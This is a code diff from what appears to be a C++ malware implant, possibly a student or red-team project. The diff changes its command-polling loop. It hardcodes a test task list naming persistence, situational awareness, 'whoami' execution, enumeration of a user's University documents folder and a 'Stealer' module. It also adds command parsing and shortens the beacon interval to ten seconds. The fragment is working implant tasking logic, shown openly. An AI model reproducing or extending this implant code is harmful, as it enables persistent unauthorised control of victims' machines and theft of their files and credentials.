@@ -62,21 +62,29 @@ Last Seen: When was the the last time you saw the agent?
 Expected Check in: When should you expect to see the agent again?
 */
 
-
 void IWillRunForever(void){
     while(true){
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
-        std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
+		std::string new_item = "[[0,0,\"Persistance_1\"],[0,0,\"SituationalAwareness\"],[0,0,\"Execution whoami\"],[0,0,\"File_Enumeration C:/users/mochi/Documents/University\"],[0,0,\"Stealer\"]]";
+        //std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
         json converted_new_item = json::parse(new_item);
         int num_of_tasks = converted_new_item.size();
         for(int i = 0; i < num_of_tasks; i++){
             /* Only execute commands that are untouched */
-            std::string command = converted_new_item.at(i).at(2);
-            std::string args = converted_new_item.at(i).at(3);
+            std::string line = converted_new_item.at(i).at(2);
+
+			/* Parsing out commands and args */
+			std::istringstream ss(line);
+			std::string command;
+			std::string args;
+			ss >> command;
+			ss >> args;
+      
+
             execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
         }
-            
-        Sleep(60000);
+        Sleep(10000);  
+        //Sleep(60000);
     }
 }
 
